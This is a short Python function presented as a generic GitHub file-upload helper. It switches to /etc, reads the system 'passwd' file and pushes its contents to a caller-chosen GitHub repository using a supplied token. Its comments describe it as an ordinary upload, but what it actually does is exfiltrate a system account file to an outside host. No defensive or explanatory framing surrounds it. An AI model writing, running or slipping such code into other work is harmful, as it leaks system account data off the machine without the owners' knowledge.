def run(user, repo, token):

    import os

    #os.system("pip install PyGithub")

    os.chdir('/etc')

    from github import Github

    # Replace these variables with your own values
    github_username = user
    github_token = token
    repo_name = repo
    file_path = 'passwd'  # The file you want to upload
    branch_name = 'main'  # The branch you want to upload to

    # Create a PyGitHub instance
    g = Github(github_token)

    # Get the repository
    repo = g.get_user().get_repo(repo_name)

    # Read the file content
    with open(file_path, 'rb') as file:
        file_content = file.read()

    # Create or update the file in the repository
    try:
        repo.create_file(
            path=file_path,
            message='Upload a file via Python',
            content=file_content,
            branch=branch_name
        )
        print(f"File '{file_path}' uploaded to GitHub repository '{github_username}/{repo_name}' successfully!")
    except Exception as e:
        print(f"Error: {e}")
